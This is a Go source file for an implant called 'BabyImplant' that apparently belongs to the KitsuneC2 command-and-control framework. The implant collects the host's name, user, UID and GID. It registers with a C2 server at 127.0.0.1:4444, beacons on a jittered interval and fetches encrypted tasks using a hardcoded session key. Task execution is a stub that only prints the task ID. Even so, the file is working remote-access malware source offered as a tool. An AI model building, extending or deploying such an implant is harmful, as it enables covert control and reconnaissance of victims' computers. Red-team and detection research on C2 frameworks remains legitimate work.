package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"encoding/json"
	"fmt"
	"math"
	"math/rand"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"
)

const (
	implantName string = "BabyImplant"
	serverIp    string = "127.0.0.1"
	serverPort  int    = 4444

	callbackInterval int    = 5
	callbackJitter   int    = 2
	implantOs        string = runtime.GOOS
	ImplantArch      string = runtime.GOARCH
)

var (
	implantId       string = ""                                 //dynamically generated based on unique host features
	sessionKey      string = "thisis32bitlongpassphraseimusing" //TODO: dynamically generate on each message to provide PFS
	shouldTerminate bool   = false
)

func main() {
	initialize()
	kitsuneLoop()
}

// main loop of the implant: Sleep for x amount of time, check for server commands, execute commands
func kitsuneLoop() {
	for !shouldTerminate {
		var waitTime = math.Abs(float64(callbackInterval + int(float32(callbackJitter)*(0.5-rand.Float32()))))
		time.Sleep(time.Duration(waitTime) * time.Second)

		conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
		if err != nil {

		}

		var receivedTask *communication.Envelope
		receivedTask, err = checkIn(conn)
		if err != nil {
			conn.Close()
			continue
		}

		executeTask(receivedTask, conn) //conn is passed so that executeTask can send a response to the server
		conn.Close()
	}
}

// Gathers basic information about the system, generates a unque implant ID, and sends a message of type "ImplantRegister" to the server.
func initialize() error {
	var currentUser, _ = user.Current()
	var hostname, _ = os.Hostname()
	implantId = cryptography.GenerateMd5FromStrings(hostname, currentUser.Username, implantName) //Generates unique ID based on hostname, username and implantName

	msg := communication.ImplantRegister{ImplantId: implantId, ImplantName: implantName, Hostname: hostname, Username: currentUser.Username, UID: currentUser.Uid, GID: currentUser.Gid}
	msgBytes, _ := json.Marshal(msg)
	envelope := communication.Envelope{MessageType: 0, Data: msgBytes}

	conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
	if err != nil {
		return err
	}
	defer conn.Close()
	err = communication.SendEnvelope(conn, envelope, []byte(sessionKey))
	if err != nil {
		return err
	}
	return nil
}

// Sends message of type "ImplantCheckin" to server and returns (if any) an envelope containing tasks.
func checkIn(conn net.Conn) (*communication.Envelope, error) {
	msg := communication.ImplantCheckin{ImplantId: implantId}
	msgBytes, _ := json.Marshal(msg)
	envelope := communication.Envelope{MessageType: 1, Data: msgBytes}

	err := communication.SendEnvelope(conn, envelope, []byte(sessionKey))
	if err != nil {
		return nil, err
	}

	receivedEnvelope, err := communication.ReceiveEnvelope(conn, []byte(sessionKey))
	if err != nil {
		return nil, err
	}
	return receivedEnvelope, nil
}

func executeTask(envelope *communication.Envelope, conn net.Conn) {
	fmt.Println("Executing task with ID: " + strconv.Itoa(envelope.MessageType))
}
